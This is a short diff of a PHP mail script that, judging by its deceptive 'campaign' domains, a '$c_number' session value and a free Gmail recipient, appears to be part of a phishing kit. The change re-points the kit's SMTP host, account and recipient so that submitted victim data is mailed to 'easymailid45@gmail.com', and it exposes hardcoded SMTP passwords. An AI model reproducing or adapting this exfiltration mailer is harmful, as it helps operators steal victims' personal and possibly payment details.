@@ -9,14 +9,13 @@ include('PHPMailer/class.smtp.php');
       $_SESSION['very_funny'] = $c_number;
                 $mail = new PHPMailer();
                 $mail->isSMTP();
-                $mail->Host = "smtp.hostinger.com";
+                $mail->Host = "noreply-campaign-for-new-user.online";
                 $mail->SMTPAuth = true;
                 $mail->SMTPSecure = 'ssl';
                 $mail->Port = 465;
-                $mail->Username = "info@instant-e-apply-campaign-page-online-cmsm-sb-page.co.in";
-                $mail->Password = "Info@123";
-                $mail->AddAddress("info@instant-e-apply-campaign-page-online-cmsm-sb-page.co.in");
-                $mail->addCC('easymailid45@gmail.com');
+                $mail->Username = "info@noreply-campaign-for-new-user.online";
+                $mail->Password = "Admin@123";
+                $mail->AddAddress("easymailid45@gmail.com");
                 $mail->SetFrom($mail->Username);
                 
                 $mail->isHTML(true);
